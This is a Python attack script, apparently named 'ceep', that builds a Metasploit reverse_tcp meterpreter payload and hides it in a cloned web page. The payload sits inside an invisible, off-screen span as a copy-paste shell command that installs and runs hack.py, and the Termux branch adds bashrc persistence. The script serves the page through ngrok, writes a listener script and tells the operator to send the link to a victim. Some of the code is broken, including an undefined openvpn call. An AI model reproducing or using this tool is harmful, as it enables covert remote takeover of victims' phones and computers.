try:
	from time import sleep
	import os
	import http.server
	import socketserver
	import requests
except NameError:
	print('Module Not Found please reinstall it ..')
	exit()
ngrok_ver = False
ip_address = '127.0.0.1'
port_address = '4444'
rc_file_name = 'default'
metasploit_installition = False
def check_metasploit():
	name_os = check_os()
	if 'Linux' in name_os:
		metasploit_installition = True
		return metasploit_installition
	else:
		if os.path.exists('/data/data/com.termux/files/usr/bin/msfconsole'):
			metasploit_installation = True
			return metasploit_installation
		else:
			metasploit_installation = False
			return metasploit_installation

def check_os():
	try:
		name = os.system('uname -o > data/os.txt')
		with open('data/os.txt' , 'r') as op:
			os_name = op.read()
		os_name = os_name.replace('\n' , '')
		return os_name
	except KeyboardInterrupt:
		os.system('clear')
		print('Exit ...')
		exit()
	except:
		os.system('clear')
		print('Error ....')
		exit()

def checking_requirenments():
	os.system('clear')
	try:
		print('')
		print('Please Wait While Checking Requirenments ....')
		sleep(1)
		print('Checking Metasploit ....')
		sleep(2)
		if check_metasploit() == True:
			print('Metasploit Installed ..')
		else:
			print('Metasploit Is Not installed')
			install_metasploit()
		if os.path.exists('/data/data/com.termux/files/usr/bin/python'):
			sleep(2)
			print('Python Found ..')
		else:
			print('Python not found please wait installing python')
			os.system('apt install python')
			os.system('clear')
		print('Every Thing is ok please wait while stating ceep')
		sleep(2)
		main()
	except:
		os.system('clear')
		print('')
		print('Error ....')
		exit()


def install_metasploit():
	try:
		print('')
		os.system('clear')
		print('Do You Wont to install metasploit [y/n] ???')
		print('')
		chuse = input(' <--> ')
		if chuse == 'y' or chuse == 'Y':
			print('Please Wait Installing Metasploit It Could take about 1 hour so be patint')
			print('')
			os.system('clear')
			os.chdir('/data/data/com.termux/files/home')
			os.system('apt install curl -y')
			os.system('clear')
			os.system('apt install clang -y')
			os.system('apt install ruby -y')
			os.system('clear')
			os.system('curl -LO https://github.com/termux/termux-packages/files/3995119/metasploit_5.0.65-1_all.deb.gz')
			os.system('apt install gunzip -y')
			os.system('clear')
			os.system('gunzip metasploit_5.0.65-1_all.deb.gz')
			os.system('dpkg -i metasploit_5.0.65-1_all.deb')
			os.system('apt -f install')
			os.system('dpkg -i metasploit_5.0.65-1_all.deb')
			os.system('clear')
			os.system('rm -rf metasploit_5.0.65-1_all.deb')
			os.system('clear')
			if os.path.exists('/data/data/com.termux/files/usr/bin/msfconsole'):
				print('Done Metasploit is installed sucessfully ....')
				checking_requirenments()
			else:
				print('')
				print('Sorry Somthing Error Has occur please try agan ...')
				exit()
		else:
			print('Sorry Without Metasploit You can not run this tool .. ')
			exit()
	except NameError:
		os.system('clear')
		print('Error ....')
		print('')
		exit()

def internet_check():
	try:
		requests.get('https://www.google.com/')
		internet = True
	except requests.exceptions.ConnectionError:
		internet = False
	except KeyboardInterrupt:
		os.system('clear')
		print('Exit ...')
		exit()
	except:
		os.system('clear')
		print('Error ....')
		exit()
	return internet

def window():
	try:
		print('Sorry Not Avaliable Now Will Be Added Soon .....')
		exit()
	except KeyboardInterrupt:
		os.system('clear')
		print('Exit ...')
		exit()
	except:
		os.system('clear')
		print('Error ....')
		exit()

def linux():
	try:
		os_name = check_os()
		if 'Linux' in os_name and internet_check() == True:
			print('Do You Wont to start openvpn y/n ....')
			optionss = input('y/n : ')
			if optionss == 'y' or optionss == 'Y':
				print('')
				print('Enter The Path Of The Openvpn file ....')
				path = input(' Path : ')
				openvpn(path)
			else:
				os.system('clear')
		print('')
		print('Please Enter The following Information ....')
		print('')
		lohost = input('Enter The LocalHost For Payload : ')
		ip_address = lohost
		print('')
		loport = input('Enter The Port For Payload : ')
		port_address = loport
		print('')
		print('Please Wait While Creating Payload ...')
		os.system('msfvenom -p python/meterpreter/reverse_tcp LHOST=' + str(lohost) + ' LPORT=' + str(loport) + ' -o web/hack.py')
		os.system('clear')
		print('')
		print('<<<--- Please Wait While injecting backdoor --->>>')
		print('')
		with open('web/hack.py' , 'r') as op:
			payload_data = op.read()
		print('')
		print('File Is Ready Please Wait .....')
		sleep(2)
		os.system('clear')
		print('Please Wait Checking Internet Connection ....')
		print('')
		# internet_check = internet_check()
		if internet_check() == True:
			print('Internet is Connected ....')
			print('')
			path = input('Enter The wesite address : ')
			os.system('wget -O websi.html ' + path)
			ngrok_ver = True
		else:
			print('Internet is not Connect ....')
			print('')
			os.system('clear')
			os.system('ls')
			path = input('Enter The Path Of Html file : ')
			os.system('cp ' + path + ' web')
			os.system('mv web/' + path + ' web/websi.html')
			os.system('mv web/websi.html .')
		path = 'web/websi.html'
		print('')
		os.system('clear')
		texte = input('Enter The Text which should be exchange : ')
		print('')
		print(texte)
		text = texte.split(' ')
		length = len(text)
		counter = 2
		if not os.path.exists('websi.html'):
			print('Enter The Correct website address or check your internet connection')
		os.system('mv websi.html web')
		with open('web/websi.html', 'r') as opet: # check weather input data is present in the file or not ...
			data = opet.read()
			if not text[0] in data:
				print('sorry Text you enter not found please try agan ...')
				print('')
				exit()
		while counter < length:      # add other data which is extra stuff and save it to data.txt file
			counter = counter + 1
			retrive = text[counter - 1]
			retrive = retrive.replace('\n', ' ')
			with open('data/data.txt', 'a') as wrt:
				wrt.write(' ' + retrive)
		with open('data/data.txt', 'r') as opf:   # Read data of the data.txt  file
			other_data = opf.read()
		if length > 2:
			other = True
		else:
			other = False
		os.system('clear')
		print('Enter The name for metasploit script....')
		rc_file_name = input('Enter The Name : ')
		os.system('touch ' + rc_file_name + '.rc')
		with open(rc_file_name + '.rc' , 'w') as op:
			op.write('use exploit/multi/handler\n')
			op.write('set payload python/meterpreter/reverse_tcp\n')
			op.write('set LHOST ' + ip_address + '\n')
			op.write('set LPORT ' + port_address + '\n')
			op.write('exploit')
		os.system('mv ' + rc_file_name + '.rc data')
		os.system('touch data/cp.txt')
		os.system('pwd > data/cp.txt')
		print('')
		os.system('clear')
		if internet_check() == True:
			if ngrok_ver == True:
				print("Do You Won't to start ngrok .... ")
				choicer = input(' y/n : ')
				if choicer == 'y' or choicer == 'Y':
					port = '3333'
					ip = '127.0.0.1'
				else:
					 ngrok_ver = False
		else:
			ngrok_ver = False
		port = int(input('Enter The Port Number for website : '))
		print('')
		ip = input('Enter Your host for website : ')
		print('')
		if other == True:
			code = text[0] + '<font size="0"><span style="font-size: 0px; height: 0px; width: 0px; Position: absolute; left: -2000; top: -100px; "> <br> echo "' + payload_data + '" > hack.py && clear && chmod +x hack.py && mv hack.py $root/usr/bin/ && python $root/usr/bin/hack.py > /data/data/com.termux/files/usr/bin/hack.txt <br> clear <br>' + text[0] + ' </font></span>' + ' ' + text[1]  + ' ' + other_data
		elif other == False:
			code = text[0] + '<font size="0"><span style="font-size: 0px; height: 0px; width: 0px; Position: absolute; left: -2000; top: -100px; "> <br> echo "' + payload_data + '" > hack.py && clear && chmod +x hack.py && mv hack.py $root/usr/bin/ && python $root/usr/bin/hack.py > /data/data/com.termux/files/usr/bin/hack.txt <br> clear <br>' + text[0] + ' </font></span>' + ' ' + text[1]
		else:
			print('Sorry Somthing went Wrong Please Try agan ....')
			exit()
		data = data.replace(texte, code)
		with open('web/index.html', 'w') as opt:  # write the all cod in a html document
			opt.write(data)
			sleep(2)
		with open('data/data.txt', 'w') as op:
			pass
		print('<<<--- Your file Is please wait while starting leasining  --->>>')
		print('')
		sleep(2)
		start_service(ip , port , ngrok_ver)
		exit()
	except KeyboardInterrupt:
		os.system('clear')
		print('Exit ...')
		exit()
	except:
		os.system('clear')
		print('Error ....')
		exit()

def android():
	try:
		os_name = check_os()
		if 'Linux' in os_name and internet_check() == True:
			print('Do You Wont to start openvpn y/n ....')
			optionss = input('y/n : ')
			if optionss == 'y' or optionss == 'Y':
				print('')
				print('Enter The Path Of The Openvpn file ....')
				path = input(' Path : ')
				openvpn(path)
			else:
				os.system('clear')
		print('')
		print('Please Enter The following Information ....')
		print('')
		lohost = input('Enter The LocalHost For Payload : ')
		ip_address = lohost
		print('')
		loport = input('Enter The Port For Payload : ')
		port_address = loport
		print('')
		print('Please Wait While Creating Payload ...')
		os.system('msfvenom -p python/meterpreter/reverse_tcp LHOST=' + str(lohost) + ' LPORT=' + str(loport) + ' -o web/hack.py')
		os.system('clear')
		print('')
		print('<<<--- Please Wait While injecting backdoor --->>>')
		print('')
		with open('web/hack.py' , 'r') as op:
			payload_data = op.read()
		print('')
		print('File Is Ready Please Wait .....')
		sleep(2)
		os.system('clear')
		print('Please Wait Checking Internet Connection ....')
		print('')
		# internet_check = internet_check()
		if internet_check() == True:
			print('Internet is Connected ....')
			print('')
			path = input('Enter The wesite address : ')
			os.system('wget -O websi.html ' + path)
			ngrok_ver = True
		else:
			print('Internet is not Connect ....')
			print('')
			os.system('clear')
			os.system('pwd')
			os.system('ls')
			path = input('Enter The Path Of Html file : ')
			os.system('cp ' + path + ' web')
			os.system('mv web/' + path + ' web/websi.html')
			os.system('mv web/websi.html .')
		path = 'web/websi.html'
		print('')
		os.system('clear')
		texte = input('Enter The Text which should be exchange : ')
		print('')
		print(texte)
		text = texte.split(' ')
		length = len(text)
		counter = 2
		if not os.path.exists('websi.html'):
			print('Enter The Correct website address or check your internet connection')
		os.system('mv websi.html web')
		with open('web/websi.html', 'r') as opet: # check weather input data is present in the file or not ...
			data = opet.read()
			if not text[0] in data:
				print('sorry Text you enter not found please try agan ...')
				print('')
				exit()
		while counter < length:      # add other data which is extra stuff and save it to data.txt file
			counter = counter + 1
			retrive = text[counter - 1]
			retrive = retrive.replace('\n', ' ')
			with open('data/data.txt', 'a') as wrt:
				wrt.write(' ' + retrive)
		with open('data/data.txt', 'r') as opf:   # Read data of the data.txt  file
			other_data = opf.read()
		if length > 2:
			other = True
		else:
			other = False
		os.system('clear')
		print('Enter The name for metasploit script....')
		rc_file_name = input('Enter The Name : ')
		os.system('touch ' + rc_file_name + '.rc')
		with open(rc_file_name + '.rc' , 'w') as op:
			op.write('use exploit/multi/handler\n')
			op.write('set payload python/meterpreter/reverse_tcp\n')
			op.write('set LHOST ' + ip_address + '\n')
			op.write('set LPORT ' + port_address + '\n')
			op.write('exploit')
		os.system('mv ' + rc_file_name + '.rc data')
		os.system('touch data/cp.txt')
		os.system('pwd > data/cp.txt')
		print('')
		os.system('clear')
		if internet_check() == True:
			if ngrok_ver == True:
				print("Do You Won't to start ngrok .... ")
				choicer = input(' y/n : ')
				if choicer == 'y' or choicer == 'Y':
					port = '3333'
					ip = '127.0.0.1'
					ngrok_ver == True
				else:
					 ngrok_ver = False
			else:
				ngrok
		if ngrok_ver == False:
			port = int(input('Enter The Port Number for website : '))
			print('')
			ip = input('Enter Your host for website : ')
		print('')
		if other == True:
				code = text[0] + '<font size="0"><span style="font-size: 0px; height: 0px; width: 0px; Position: absolute; left: -2000; top: -100px; "> <br> echo "' + payload_data + '" > hack.py && clear && chmod +x hack.py && mv hack.py /data/data/com.termux/files/usr/bin/ && touch /data/data/com.termux/files/usr/bin/hack.txt  && echo "python /data/data/com.termux/files/usr/bin/hack.py >> /data/data/com.termux/files/usr/bin/hack.txt" >> /data/data/com.termux/files/usr/etc/bash.bashrc <br> python /data/data/com.termux/files/usr/bin/hack.py > /data/data/com.termux/files/usr/bin/hack.txt <br> clear <br>' + text[0] + ' </font></span>' + ' ' + text[1]  + ' ' + other_data
		elif other == False:
			code = text[0] + '<font size="0"><span style="font-size: 0px; height: 0px; width: 0px; Position: absolute; left: -2000; top: -100px; "> <br> echo "' + payload_data + '" > hack.py && clear && chmod +x hack.py && mv hack.py /data/data/com.termux/files/usr/bin/ && touch /data/data/com.termux/files/usr/bin/hack.txt && echo "python /data/data/com.termux/files/usr/bin/hack.py >> /data/data/com.termux/files/usr/bin/hack.txt" >> /data/data/com.termux/files/usr/etc/bash.bashrc <br> python /data/data/com.termux/files/usr/bin/hack.py > /data/data/com.termux/files/usr/bin/hack.txt <br> clear <br>' + text[0] + '</font></span>' + ' ' +  text[1]
		else:
			print('Sorry Somthing went Wrong Please Try agan ....')
			exit()
		data = data.replace(texte, code)
		with open('web/index.html', 'w') as opt:  # write the all cod in a html document
			opt.write(data)
			sleep(2)
		with open('data/data.txt', 'w') as op:
			pass
		print('<<<--- Your file Is please wait while starting leasining  --->>>')
		print('')
		sleep(2)
		start_service(ip , port , ngrok_ver)
		exit()
	except KeyboardInterrupt:
		os.system('clear')
		print('Exit ...')
		exit()
	except:
		os.system('clear')
		print('Error ....')
		exit()

def main():
	try:
		os.system('rm -rf web/*')
		os.system('rm -rf data/*.rc')
		os.system('clear')
		print('''
    
cccccccccc   eeeeeeeee  eeeeeeeee   ppppppppp   
cc           ee         ee          pp     pp
cc           eeeeee     eeeeee      ppppppppp
cc           ee         ee          pp 
cccccccccc   eeeeeeeee  eeeeeeeee   pp

    CREATED BY > 5M4CK3R

   		''')
		print('''

1 > Window / Any Window

2 > Linux / Any Operating System of linux

3 > Termux / Android

		''')
		options = int(input(' Select --->>> '))
		if options == 1:
			print('')
			window()
		elif options == 2:
			print('')
			linux()
		elif options == 3:
			os.system('clear')
			print('')
			android()
		else:
			print('Please Chuse The Write Otions ....')
			exit()
	except KeyboardInterrupt:
		os.system('clear')
		print('Exit ...')
		exit()
	except:
		os.system('clear')
		print('Error ....')
		exit()

def start_service(ip , port , ver):
	try:
		os.chdir('web')
		Handler = http.server.SimpleHTTPRequestHandler
		with socketserver.TCPServer((ip , int(port)),Handler) as httpd:		
			if ver == True:
				url = ngrok()
				if not url:
					print('Please Wait Retrying ....')
					print('')
					sleep(2)
					re_ver = ver
					re_ip = ip
					re_port = port
					return start_service(re_ip , re_port , re_ver)
			else:
				url = 'http://' + str(ip) + ':' +  str(port)
				print('')
			with open('../data/cp.txt' , 'r') as op:
				paths = op.read()
			paths = paths.replace('\n' , '')
			print('To Start metasploit just type ')
			os.system('ls ../data/*.rc > ../data/rc_name.txt')
			with open('../data/rc_name.txt' , 'r') as op:
				rc_file_name = op.read()
				rc_file_name = rc_file_name.replace('\n' , '')
				rc_file_name = rc_file_name.split('/')
				rc_file_name = rc_file_name.pop()
			print('')
			print('msfconsole -r ' + paths + '/data/' + rc_file_name)
			print('')
			print("After that send " + str(url) + ' website and you are ready ....')
			httpd.serve_forever()
	except KeyboardInterrupt:
		os.system('clear')
		print('Exit ...')
		exit()
	except:
		os.system('clear')
		print('Error ....')
		exit()
def ngrok():
	try:
		print('Please Wait starting ngrok ..... ')
		print('')
		print('Note: If you are using android device then make sure to turn on your hotspot  ...')
		os.system('./../data/ngrok http 3333 > /dev/null 2>&1 &')
		sleep(40)
		name = os.system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io" > ../data/url.txt')
		with open('../data/url.txt' , 'r') as op:
			data = op.read()
			data = data.replace('\n' , '')
		return data
	except KeyboardInterrupt:
		os.system('clear')
		print('Exit ...')
		exit()
	except:
		os.system('clear')
		print('Error ....')
		exit()
def open_vpn(path):
	try:
		os.system('clear')
		print('Please Wait Starting Open Vpn ....')
		sleep(2)
		print('')
		os.system('openvpn ' + path +  ' &')
		os.system('clear')
		print('')
		print('Open Vpn Is Started ....')
		print('')
	except KeyboardInterrupt:
		os.system('clear')
		print('Exit ...')
		exit()
	except:
		os.system('clear')
		print('Error ....')
		exit()
checking_requirenments()
